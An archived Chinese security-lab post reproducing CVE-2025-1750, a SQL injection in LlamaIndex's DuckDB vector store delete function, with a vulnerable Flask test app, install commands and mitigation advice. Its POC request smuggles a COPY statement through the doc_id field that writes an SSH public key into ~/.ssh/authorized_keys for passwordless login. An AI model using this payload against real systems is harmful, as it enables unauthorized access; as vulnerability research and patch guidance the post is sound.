@@ -1,0 +1,197 @@
+---
+cve: "CVE-2025-1750"
+source: "gelusus/wxvl 公众号漏洞文库"
+---
+
+#  【成功复现】LlamaIndex SQL注入漏洞(CVE-2025-1750)  
+原创 弥天安全实验室  弥天安全实验室   2025-07-10 04:40  
+  
+#   
+  
+网安引领时代，弥天点亮未来    
+   
+  
+  
+  
+  
+  
+   
+  
+![Image](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDCVZx96ZMibcJI8GEwNnAyx4yiavy2qelCaTeSAibEeFrVtpyibBCicjbzwDkmBJDj9xBWJ6ff10OTQ2w/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
+  
+  
+**0x00写在前面**  
+  
+**本次测试仅供学习使用，如若非法他用，与平台和本文作者无关，需自行负责！**  
+  
+![Image](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDCVZx96ZMibcJI8GEwNnAyx4yiavy2qelCaTeSAibEeFrVtpyibBCicjbzwDkmBJDj9xBWJ6ff10OTQ2w/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
+  
+  
+**0x01漏洞介绍**  
+  
+![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDQxibXcibvdcQt4ia7TDpt8GTfDVgg2jzgaxVicrRTb1Uje0paqsqLpoOjVdPVmiaJcGdViconoRuuAUbQ/640?wx_fmt=png&from=appmsg "")  
+  
+  
+LlamaIndex是LlamaIndex开源的一个 LLM 应用程序的数据框架。  
+  
+LlamaIndex v0.12.19版本存在SQL注入漏洞，该漏洞源于ref_doc_id参数操作不当导致SQL注入，可能导致远程代码执行。  
+  
+  
+![Image](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDCVZx96ZMibcJI8GEwNnAyx4yiavy2qelCaTeSAibEeFrVtpyibBCicjbzwDkmBJDj9xBWJ6ff10OTQ2w/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
+  
+  
+**0x02影响版本**  
+  
+llama_index <=0.12.19  
+  
+![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDQxibXcibvdcQt4ia7TDpt8GT371Ttkwict2C0fFxgKjktAqPEL1ney0uhPYjrorYleMNTM6YticA6NUw/640?wx_fmt=png&from=appmsg "")  
+  
+  
+![Image](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDCVZx96ZMibcJI8GEwNnAyx4yiavy2qelCaTeSAibEeFrVtpyibBCicjbzwDkmBJDj9xBWJ6ff10OTQ2w/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
+  
+  
+**0x03漏洞复现**  
+  
+1.漏洞环境搭建  
+  
+搭建环境源代码  
+```
+from flask import Flask, request, jsonify, render_template
+import os
+import numpy as np
+from llama_index.vector_stores.duckdb import DuckDBVectorStore
+from llama_index.core.schema import TextNode
+app = Flask(__name__)
+persist_dir = "./persist"
+os.makedirs(persist_dir, exist_ok=True)
+vector_store = DuckDBVectorStore("chatbot.duckdb", persist_dir=persist_dir,recreate_table=True)
+def add_document(doc_id, text, category):
+    embedding = np.random.rand(1536).tolist()
+    text_node = TextNode(id_=doc_id, text=text, embedding=embedding, metadata={"category": category})
+    vector_store.add([text_node])
+add_document("doc_1", "Machine learning is amazing!", "AI")
+add_document("doc_2", "Deep learning improves natural language processing.", "NLP")
+add_document("doc_3", "DuckDB is great for handling large datasets.", "Database")
+@app.route('/delete', methods=['POST'])
+def ask():
+    data = request.get_json()
+    doc_id = data.get('doc_id')
+    vector_store.delete(ref_doc_id=doc_id)
+    return jsonify({'message': "ok"})
+if __name__ == '__main__':
+    app.run(host='0.0.0.0', port=8000)
+```  
+  
+安装依赖  
+```
+pip install flask numpy llama-index-vector-stores-duckdb
+```  
+  
+![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDQxibXcibvdcQt4ia7TDpt8GTAPPBSXEuJhhgqHWDJNuy9qsgljI9kPjPbQA45bLN9GYo8LyvYibNoGA/640?wx_fmt=png&from=appmsg "")  
+  
+运行代码  
+  
+![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDQxibXcibvdcQt4ia7TDpt8GTSdrZZ3FeYpHQu1nkru9BYSnCuNFzMLwudTicr60r645nhBpG2TPs2Lg/640?wx_fmt=png&from=appmsg "")  
+  
+访问漏洞环境  
+  
+![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDQxibXcibvdcQt4ia7TDpt8GT49ndEgWgtgJktZHakuuEq55JACOWYggwYIgcF8h4S05YnDk1KOqibYA/640?wx_fmt=png&from=appmsg "")  
+  
+2.对漏洞进行复现  
+  
+   
+**POC**  
+  
+漏洞复现  
+```
+POST /delete HTTP/1.1
+Host: 10.211.55.2
+Accept-Language: zh-CN,zh;q=0.9
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Accept-Encoding: gzip, deflate, br
+Connection: keep-alive
+Content-Type: application/json
+Content-Length: 812
+
+{"doc_id":"doc1';COPY (SELECT 'ssh-rsa AAAAAB3NzaC1yc2EAAAADAQABAAACAQCwJF10XbdhMTV8VfriiewblV2Pv8O+W42KT0H6VmNzqWLZYkLpbgHZN9fBw2XoBjMxYrs8vA5hpVU2fmoU2DX7SHy8iavtU0ZtCPxwMDloR5BHnq6wzaTvgrcIWqJ9FKdT/1f6fv9/Mbt6qEGUTZSFoFA8Q5drKp4z3jR18h/5+gQVv1/OdoWleNjxxek0O8NmKm7cd2dXNKZDu39LeAG1C94BmqO5G3I7BXEuvX46BE/7ZUvVwnBS2SQGi6GJDCegqMIl5t0DnfyiDJelBTxxFewChzFBFoTJVBoP8Ve+lLaVxWDb6bQ9EsQcQXHGrYfigH8u3d7fe2f2uG3Cp/PwerFXpRN9yx6LM6Y+d5GaiRgv+aJ//AjxVGNL4r+baGHXDnQOKJSUCwBJcHasTPWZsTmnBsmgHYId9U9RFoFCrXq9sqNhhRealPSy3ZR7RKQKmRi/uXy86VMXZd6nHuTxqTLtgu+rMgiHjZ63JsOGckNV8LqQEHs0eA/6rwe8a7WHYYw7TUoFv/xd4kdyl6AN8lMZtf37ELJQhu3oWGGzWFbPk+22Yy1JGYPzWMb0YPxm9wczD0FTQGjDUvCljbxJjbf27SzX+Ld+8AQ4jxu3JuuEYH9CV9vV96Wu621t+7YwCp1A3iEaCT66hFKQihSCU3VtqIMQ+YAVEmadx6yvMQ== yunzui@mitian.com') TO '~/.ssh/authorized_keys';-- -"}
+
+```  
+  
+     执行SQL命令，通过相应判断漏洞存在  
+  
+![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDQxibXcibvdcQt4ia7TDpt8GTggJaic5WeLI1azCdcjq2pFPQQFncXew0Udfo6m2wXptyQREuVzG2oow/640?wx_fmt=png&from=appmsg "")  
+  
+  
+查看成功写入公钥，可ssh免密登录  
+  
+![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDQxibXcibvdcQt4ia7TDpt8GT6Jic0zqnKZenNn6AaqnlibAKNKFKsVicFxCbOcNfd8BL5LJZib1HaLl2Dg/640?wx_fmt=png&from=appmsg "")  
+  
+  
+  
+  
+![Image](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDCVZx96ZMibcJI8GEwNnAyx4yiavy2qelCaTeSAibEeFrVtpyibBCicjbzwDkmBJDj9xBWJ6ff10OTQ2w/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
+  
+  
+**0x04修复建议**  
+  
+  
+目前厂商已发布升级补丁以修复漏洞，补丁获取链接：  
+  
+临时缓解措施：  
+  
+1.输入验证：对ref_doc_id 参数进行严格的输入验证，确保其不包含任何可能导致 SQL 注入的字符  
+。  
+  
+2.参数化查询：使用参数化查询来执行SQL 语句，避免直接将用户输入拼接到 SQL 查询中  
+。  
+  
+  
+建议尽快升级修复漏洞，再次声明本文仅供学习使用，非法他用责任自负！                       
+```
+https://github.com/run-llama/llama_index/releases/tag/v0.12.40
+https://mp.weixin.qq.com/s/cWaTgItTFgwzD4zVBnn_ZA
+https://mp.weixin.qq.com/s/W2dyl0sQ-eddtnyimxA6Wg
+```  
+  
+  
+  
+弥天简介  
+  
+学海浩茫，予以风动，必降弥天之润！弥天安全实验室成立于2019年2月19日，主要研究安全防守溯源、威胁狩猎、漏洞复现、工具分享等不同领域。目前主要力量为民间白帽子，也是民间组织。主要以技术共享、交流等不断赋能自己，赋能安全圈，为网络安全发展贡献自己的微薄之力。  
+  
+口号 网安引领时代，弥天点亮未来  
+  
+  
+  
+![Image](https://mmbiz.qpic.cn/mmbiz_gif/b96CibCt70iaaqjXT4YxgHVARD1NNv0RvKtiaAvXhmruVqgavPY3stwrfvLKetGycKUfxIq3Xc6F6dhU7eb4oh2gg/640?wx_fmt=gif&wxfrom=5&wx_lazy=1&tp=webp "")  
+  
+   
+  
+  
+知识分享完了  
+  
+喜欢别忘了关注我们哦~  
+  
+学海浩茫，  
+  
+予以风动，  
+  
+必降弥天之润！  
+  
+  
+   弥  天  
+  
+安全实验室  
+  
+![Image](https://mmbiz.qpic.cn/mmbiz_jpg/MjmKb3ap0hDyTJAqicycpl7ZakwfehdOgvOqd7bOUjVTdwxpfudPLOJcLiaSZnMC7pDDdlIF4TWBWWYnD04wX7uA/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
+  
+  
+  
+  
+
+
+---
+
+> 来源：gelusus/wxvl（微信公众号漏洞文章自动归档，原文见文首链接）
